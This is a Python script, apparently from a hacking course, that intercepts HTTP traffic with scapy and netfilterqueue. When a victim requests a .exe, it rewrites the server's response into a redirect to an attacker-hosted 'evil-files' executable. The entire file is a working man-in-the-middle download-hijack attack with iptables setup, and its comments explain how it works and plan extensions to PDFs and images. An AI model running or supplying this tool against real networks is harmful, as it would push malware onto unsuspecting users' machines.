'''
Usage: Detect when a user requests a certain file and send them a malicious file
Note:
    1) When someone downloads a file, the request and response are sent thru the http layer
        http data is contained inside of the raw layer
    2) How to tell whether a packet is a http response vs http request
        Look at tcp layer
            http response => sport (source port) = http or 80
            http request => dport (destination port) = http or 80
    3) If someone is downloading a file the load field inside of the raw layer will contain an .exe
    4) url to download from = Domain/Host + Location of File on domain
    5) To replace a file we will modify the http response not the http request otherwise we would have to
        do a tcp handshake
    6) Determining which response corresponds to which request
        [TCP].awk (request) = [TCP].seq (response)
IMPROVEMENTS NEEDED:
    1) Instead of just checking whether a packet requests for a .exe, also check if it requests for
        an image, pdf, etc.
'''
import netfilterqueue
import subprocess
import scapy.all as scapy

ack_list = []
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #HTTP Request
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] .exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
            #if ".pdf" in scapy_packet[scapy.Raw].load:
            #if ".exe" in scapy_packet[scapy.Raw].load:
        #HTTP Response
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] Replacing file")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://10.0.2.15/evil-files/picture1.exe\n\n")
                packet.set_payload(str(modified_packet))
    packet.accept()  # forwards packet to destination

try:
    print("[+] Creating packet queue")
    #subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[-] Removing packet queue")
    subprocess.call(["iptables", "--flush"])